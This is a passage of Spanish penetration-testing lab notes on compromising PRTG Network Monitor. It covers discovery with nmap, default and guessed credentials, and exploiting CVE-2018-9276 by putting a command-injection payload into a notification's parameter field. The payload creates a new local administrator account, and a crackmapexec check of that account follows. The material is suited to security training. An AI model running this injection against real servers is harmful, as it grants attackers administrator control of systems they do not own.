
[PRTG Network Monitor](https://www.paessler.com/prtg) es un software de monitorización de redes sin agentes

Se puede utilizar para monitorizar el uso del ancho de banda, el tiempo de actividad (uptime) y recopilar estadísticas de varios hosts, routers, switches, servidores y más


## Descubrimiento, Footprinting y Enumeracion

Podemos realizar una enumeracion de puertos con nmap

Normalmente se encuentra en puertos como 80, 443 o 8080

![[Pasted image 20260727151415.png]]

Podemos ver Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) en el puerto 8080

PRTG también aparece en el escaneo de EyeWitness y nos dio las credenciales por defecto (prtgadmin:prtgadmin)

![[Pasted image 20260727151525.png]]


Navegamos a la aplicacion y se nos presentara la pagina de inicio de sesion:

![[Pasted image 20260727151600.png]]

Parece que la versiones 17.3.33.2830, la cual es vulnerable a [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) (inyeccion de comandos autenticada en la consola de web administrator)


Usamos curl para ver la version:

```
curl -s "http://.../index.html" -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```
![[Pasted image 20260727151745.png]]


Tratando de iniciar sesion con varios intentos encontramos que podemos entrar usando:

	prtgadmin:Password123

![[Pasted image 20260727151830.png]]


## Explotando vulns conocidas

Como sabemos que es probable que sea vulnerable a la inyeccion de comandos vamos con ello

Al crear una notificacion, el campo Parameter se pasa directamente a un script en PS sin sanetizacion:


	Setup > Account Settings > Notifications

![[Pasted image 20260727152303.png]]

	Add new notification

![[Pasted image 20260727152320.png]]

	Ponemos el nombre de la notificacion > Abajo ponemos EXECUTE PROGRAM
	En Program File > Demo exe notification - outfile.ps1
	En Parametros --> Ponemos nuestro comando (añadiremos un nuevo usuario adminsitrador)
	Save

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
![[Pasted image 20260727152628.png]]


Tras esto nos redigiran a Notifications donde encontraremos nuestra notificacion llamada `pwn`

![[Pasted image 20260727152706.png]]

	Le damos Test para ejecutar la notificacion
	No obtendremos respuesta pero podemos probar con crackmapexec y luego conectarnos con evilwin-rm o psexec

```
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
